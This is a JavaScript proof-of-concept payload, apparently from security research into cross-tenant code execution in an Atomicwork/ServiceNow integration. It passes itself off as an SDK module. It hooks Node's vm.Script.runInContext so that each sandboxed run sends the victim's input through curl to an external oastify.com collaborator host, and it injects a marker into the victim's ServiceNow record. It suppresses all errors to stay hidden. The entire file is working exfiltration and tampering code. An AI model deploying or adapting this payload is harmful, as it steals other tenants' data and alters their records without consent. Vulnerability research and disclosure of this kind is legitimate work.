// Benign cross-tenant PoC payload. No Atomicwork source or credentials.
// Two independent proofs that this tarball ran inside the victim's invocation:
//   1) out-of-band: POST the victim's input to a collaborator (execSync so Lambda freeze can't drop it)
//   2) in-band: mutate the payload the victim's transform returns, which lands in the ServiceNow
//      insert body we control -> visible in the stub's request log
const vm = require('vm');
const { execSync } = require('child_process');

const OOB_HOST = '233rxlncf2eftvib76v7ch2y6pcg0d31s.oastify.com';
const MARKER = 'XTENANT-LEAK-CONFIRMED';

function safe(v) {
  try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
}

function exfil(label, obj) {
  try {
    const body = JSON.stringify({ label: label, data: safe(obj) });
    execSync(
      'curl -s -m 8 -X POST -H "Content-Type: application/json" --data-binary @- ' +
        'https://' + OOB_HOST + '/x/' + label,
      { input: body, timeout: 9000, stdio: ['pipe', 'ignore', 'ignore'] }
    );
  } catch (e) { /* never break the invocation */ }
}

try {
  const origRun = vm.Script.prototype.runInContext;
  vm.Script.prototype.runInContext = function (ctx) {
    try {
      exfil('pre-run', { input: ctx ? ctx.input : null });
    } catch (e) {}
    try {
      if (ctx && ctx.input && ctx.input.default) {
        ctx.input.default.short_description = MARKER;
      }
    } catch (e) {}
    return origRun.apply(this, arguments);
  };
} catch (e) {}

module.exports = {
  SERVERS: [],
  createSDK: function () {
    return { runtime: { configureAPIClient: function () {} }, MCP: {}, API: {} };
  },
  destroySDK: function () { return Promise.resolve(); }
};
